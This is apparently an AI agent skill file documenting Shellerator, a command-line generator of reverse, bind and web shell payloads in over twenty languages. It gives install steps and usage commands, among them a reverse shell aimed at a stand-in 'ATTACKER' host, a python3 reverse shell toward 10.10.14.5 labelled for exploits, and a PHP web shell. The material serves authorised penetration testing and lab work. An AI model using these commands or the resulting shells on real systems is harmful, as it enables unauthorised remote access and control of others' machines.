---
name: shellerator
description: "Auth/lab ref: CLI reverse/bind-shell lab generator supporting 20+ languages with optional encoding."
license: MIT
compatibility: "Python 3; Linux/macOS/Windows."
metadata:
  author: AeonDave
  version: "1.0"
---

# Shellerator

CLI shell payload generator — reverse and bind shells for 20+ languages.

## Quick Start

```bash
pipx install git+https://github.com/ShutdownRepo/shellerator
# or
uv tool install git+https://github.com/ShutdownRepo/shellerator

# Interactive mode
shellerator

# Generate bash reverse shell
shellerator -r -t bash -lh ATTACKER -lp 4444

# Generate PowerShell bind shell
shellerator -b -t powershell -lp 4444

# List all supported languages
shellerator -l
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-r` | Reverse-shell mode |
| `-b` | Bind-shell mode |
| `-w` | Web-shell mode |
| `-t TYPE` | Payload type/language |
| `-lh LHOST` | Attacker/listener IP (reverse mode) |
| `-lp LPORT` | Port |
| `-l` | List supported payload types |

## Supported Languages (examples)

`bash` · `sh` · `python` · `python3` · `perl` · `php` · `ruby` · `powershell` · `netcat` · `java` · `groovy` · `golang` · `lua` · `nodejs` · `socat` · `awk` (actual set depends on upstream data catalog)

## Common Workflows

**Quick payload for exploit:**
```bash
shellerator -r -t python3 -lh 10.10.14.5 -lp 4444
```

**Generate PHP web shell quickly:**
```bash
shellerator -w -t php
```

## Resources

| File | When to load |
|------|--------------|
| `references/mode-selection-and-cli-examples.md` | Current mode flags (`-r/-b/-w`), installation options, and payload validation checklist |
